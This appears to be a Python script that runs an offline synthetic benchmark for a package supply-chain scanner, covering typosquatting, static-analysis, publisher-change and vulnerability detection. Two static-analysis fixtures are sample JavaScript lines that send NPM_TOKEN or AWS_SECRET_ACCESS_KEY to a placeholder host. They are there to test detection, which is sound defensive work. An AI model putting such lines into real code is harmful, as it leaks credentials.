"""Reproducible offline benchmark for deterministic Phase 1/2 detection behavior.

Ground truth means "this synthetic scenario should produce an investigation indicator", not
"confirmed malware".  No package source is executed and no network request is made.
"""

from __future__ import annotations

import argparse
import json
from dataclasses import asdict, dataclass
from datetime import datetime, timezone

from app.detection.osv import OsvAdvisory
from app.detection.rules import (
    correlate_publisher_risk,
    detect_install_script_changes,
    detect_known_vulnerabilities,
    detect_publisher_changes,
)
from app.detection.static_analysis import (
    InspectedFile,
    StaticInspection,
    findings_for_inspection,
    scan_source_indicators,
)
from app.detection.typosquatting import detect_typosquatting
from app.models.schemas import GraphNode, RegistryMetadataResponse, ScanGraph


OBSERVED_AT = datetime(2026, 1, 1, tzinfo=timezone.utc)
LIMITATION = (
    "Synthetic indicator benchmark only; it is not an independent real-world malware corpus. "
    "Behavior classes overlap unit-test categories, although thresholds were not optimized against this suite."
)


@dataclass(frozen=True)
class BenchmarkCase:
    case_id: str
    category: str
    expected_indicator: bool
    predicted_indicator: bool
    rationale: str


@dataclass(frozen=True)
class BenchmarkMetrics:
    true_positives: int
    false_positives: int
    true_negatives: int
    false_negatives: int
    precision: float
    recall: float
    f1_score: float
    false_positive_rate: float


@dataclass(frozen=True)
class BenchmarkReport:
    benchmark: str
    ground_truth_definition: str
    limitation: str
    metrics: BenchmarkMetrics
    cases: tuple[BenchmarkCase, ...]

    def as_dict(self) -> dict:
        return asdict(self)


def run_benchmark() -> BenchmarkReport:
    cases = tuple(
        [
            _typo_case("typo-deletion", "expres", ("express",), True),
            _typo_case("typo-transposition", "lodahs", ("lodash",), True),
            _typo_case("typo-exact-trusted", "express", ("express",), False),
            _typo_case("typo-legitimate-suffix", "express-session", ("express",), False),
            _typo_case("typo-different-scope", "@other/croe", ("@angular/core",), False),
            _static_case(
                "static-install-correlation",
                "const cp=require('child_process');cp.exec('id');fetch('https://invalid.test/'+process.env.NPM_TOKEN)",
                install_reachable=True,
                expected=True,
            ),
            _static_case(
                "static-credential-network",
                "fetch('https://invalid.test/'+process.env.AWS_SECRET_ACCESS_KEY)",
                install_reachable=False,
                expected=True,
            ),
            _static_case(
                "static-benign-install-script",
                "const fs = require('fs'); fs.mkdirSync('build', {recursive: true});",
                install_reachable=True,
                expected=False,
            ),
            _static_case(
                "static-benign-process",
                "require('child_process').exec('git --version')",
                install_reachable=False,
                expected=False,
            ),
            _static_case(
                "static-network-only",
                "fetch('https://registry.npmjs.org/status')",
                install_reachable=False,
                expected=False,
            ),
            _publisher_case("publisher-changed", "alice", "bob", [], [], True),
            _publisher_case("publisher-unchanged", "alice", "alice", [], [], False),
            _publisher_case("publisher-metadata-missing", None, None, None, None, False),
            _publisher_case("publisher-install-correlation", "alice", "bob", [], ["postinstall"], True, correlated=True),
            _vulnerability_case("known-vulnerability", True),
            _vulnerability_case("no-known-vulnerability", False),
        ]
    )
    return BenchmarkReport(
        benchmark="provenyx-synthetic-indicator-evaluation-v1",
        ground_truth_definition=(
            "Positive means the labeled synthetic scenario is expected to produce a security investigation indicator; "
            "it does not mean confirmed malware or exploitation."
        ),
        limitation=LIMITATION,
        metrics=_metrics(cases),
        cases=cases,
    )


def render_markdown(report: BenchmarkReport) -> str:
    metrics = report.metrics
    lines = [
        "# Provenyx synthetic detection benchmark",
        "",
        report.ground_truth_definition,
        "",
        f"> Limitation: {report.limitation}",
        "",
        "## Metrics",
        "",
        "| TP | FP | TN | FN | Precision | Recall | F1 | False-positive rate |",
        "|---:|---:|---:|---:|---:|---:|---:|---:|",
        (
            f"| {metrics.true_positives} | {metrics.false_positives} | {metrics.true_negatives} | "
            f"{metrics.false_negatives} | {metrics.precision:.3f} | {metrics.recall:.3f} | "
            f"{metrics.f1_score:.3f} | {metrics.false_positive_rate:.3f} |"
        ),
        "",
        "## Cases",
        "",
        "| Case | Category | Expected indicator | Predicted indicator | Result |",
        "|---|---|---:|---:|---|",
    ]
    for case in report.cases:
        result = _classification(case)
        lines.append(
            f"| `{case.case_id}` | {case.category} | {str(case.expected_indicator).lower()} | "
            f"{str(case.predicted_indicator).lower()} | {result} |"
        )
    return "\n".join(lines) + "\n"


def _typo_case(case_id: str, package: str, trusted: tuple[str, ...], expected: bool) -> BenchmarkCase:
    current = _graph(_node(package, "1.0.0", direct=True))
    actual = bool(
        detect_typosquatting(
            current,
            candidate_ids={current.nodes[0].id},
            observed_at=OBSERVED_AT,
            trusted_packages=trusted,
        )
    )
    return BenchmarkCase(case_id, "typosquatting", expected, actual, "Synthetic npm package-name similarity case.")


def _static_case(case_id: str, source: str, *, install_reachable: bool, expected: bool) -> BenchmarkCase:
    node = _node("fixture-package", "1.0.0", direct=True)
    current = _graph(node)
    inspected = InspectedFile(
        path="package/install.js" if install_reachable else "package/index.js",
        install_reachable=install_reachable,
        indicators=tuple(scan_source_indicators("package/index.js", source)),
    )
    inspection = StaticInspection(identity="sha512-synthetic", verified=True, files=(inspected,))
    actual = bool(findings_for_inspection(current, node, inspection, OBSERVED_AT))
    return BenchmarkCase(case_id, "static-analysis", expected, actual, "Synthetic source text; never executed.")


def _publisher_case(
    case_id: str,
    old_publisher: str | None,
    new_publisher: str | None,
    old_scripts: list[str] | None,
    new_scripts: list[str] | None,
    expected: bool,
    *,
    correlated: bool = False,
) -> BenchmarkCase:
    baseline = _graph(_node("fixture-package", "1.0.0", direct=True, publisher=old_publisher, scripts=old_scripts))
    current = _graph(_node("fixture-package", "2.0.0", direct=True, publisher=new_publisher, scripts=new_scripts))
    findings = detect_publisher_changes(baseline, current, observed_at=OBSERVED_AT)
    if correlated:
        findings.extend(detect_install_script_changes(baseline, current, observed_at=OBSERVED_AT))
        findings = correlate_publisher_risk(findings, observed_at=OBSERVED_AT)
        actual = any(finding.rule_id == "publisher-change" and finding.priority_score > 60 for finding in findings)
    else:
        actual = any(finding.rule_id in {"publisher-change", "maintainer-change"} for finding in findings)
    return BenchmarkCase(case_id, "publisher-intelligence", expected, actual, "Persisted synthetic release snapshots.")


def _vulnerability_case(case_id: str, expected: bool) -> BenchmarkCase:
    node = _node("fixture-package", "1.0.0", direct=True)
    advisories = (
        OsvAdvisory(id="GHSA-synthetic", aliases=("CVE-2026-0001",), summary="Synthetic", severity="high"),
    ) if expected else ()
    actual = bool(
        detect_known_vulnerabilities(
            _graph(node),
            advisories={(node.name, node.version): advisories},
            observed_at=OBSERVED_AT,
        )
    )
    return BenchmarkCase(case_id, "known-vulnerability", expected, actual, "Synthetic exact-release OSV fixture.")


def _node(
    name: str,
    version: str,
    *,
    direct: bool,
    publisher: str | None = None,
    scripts: list[str] | None = None,
) -> GraphNode:
    registry = (
        RegistryMetadataResponse(status="available", publisher=publisher, install_scripts=scripts)
        if publisher is not None or scripts is not None
        else RegistryMetadataResponse(status="unavailable", error="synthetic missing metadata")
    )
    return GraphNode(
        id=f"{name}@{version}",
        name=name,
        version=version,
        direct=direct,
        lockfile_paths=[f"node_modules/{name}"],
        registry=registry,
    )


def _graph(*nodes: GraphNode) -> ScanGraph:
    return ScanGraph(scan_id="benchmark", status="complete", nodes=list(nodes))


def _metrics(cases: tuple[BenchmarkCase, ...]) -> BenchmarkMetrics:
    tp = sum(case.expected_indicator and case.predicted_indicator for case in cases)
    fp = sum(not case.expected_indicator and case.predicted_indicator for case in cases)
    tn = sum(not case.expected_indicator and not case.predicted_indicator for case in cases)
    fn = sum(case.expected_indicator and not case.predicted_indicator for case in cases)
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0
    fpr = fp / (fp + tn) if fp + tn else 0.0
    return BenchmarkMetrics(tp, fp, tn, fn, precision, recall, f1, fpr)


def _classification(case: BenchmarkCase) -> str:
    if case.expected_indicator:
        return "TP" if case.predicted_indicator else "FN"
    return "FP" if case.predicted_indicator else "TN"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Run the offline Provenyx synthetic detection benchmark")
    parser.add_argument("--format", choices=("json", "markdown"), default="markdown")
    args = parser.parse_args(argv)
    report = run_benchmark()
    print(json.dumps(report.as_dict(), indent=2, sort_keys=True) if args.format == "json" else render_markdown(report), end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
